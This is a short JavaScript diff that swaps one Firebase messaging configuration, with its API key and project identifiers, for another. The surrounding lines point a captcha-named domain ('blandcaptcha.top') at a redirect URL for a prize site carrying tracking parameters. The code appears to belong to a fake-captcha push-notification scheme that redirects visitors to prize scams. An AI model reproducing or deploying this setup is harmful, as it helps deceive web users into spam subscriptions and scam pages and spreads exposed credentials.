@@ -26,7 +26,17 @@ loadScript('https://www.gstatic.com/firebasejs/9.8.1/firebase-app-compat.js')
 	});
 
 
-var config = { "apiKey": "AIzaSyDwTpeRkq-H2LAy3t-dWoCwZ6zgQZ4aMMc", "authDomain": "vvvv-2e59f.firebaseapp.com", "databaseURL": "https://vvvv-2e59f.firebaseio.com", "projectId": "vvvv-2e59f", "appId": "1:454244093531:web:097491694b442c6684797e", "storageBucket": "vvvv-2e59f.appspot.com", "messagingSenderId": "454244093531" };
+var config = {
+  apiKey: "AIzaSyDnU949ApofKmeD_P2bv_AE5bpRIdz1pkg",
+  authDomain: "shtoringithubpushes.firebaseapp.com",
+  databaseURL: "https://shtoringithubpushes.firebaseio.com",
+  projectId: "shtoringithubpushes",
+  storageBucket: "shtoringithubpushes.appspot.com",
+  messagingSenderId: "279155818136",
+  appId: "1:279155818136:web:db3e5f8199b9b2afa59aed",
+  measurementId: "G-JZHK778HK0"
+};
+
 var mainDomain = 'blandcaptcha.top';
 var redirectUrl = 'https://best-prizes.life/?u=3w8p605&o=pn1kfzq';
 
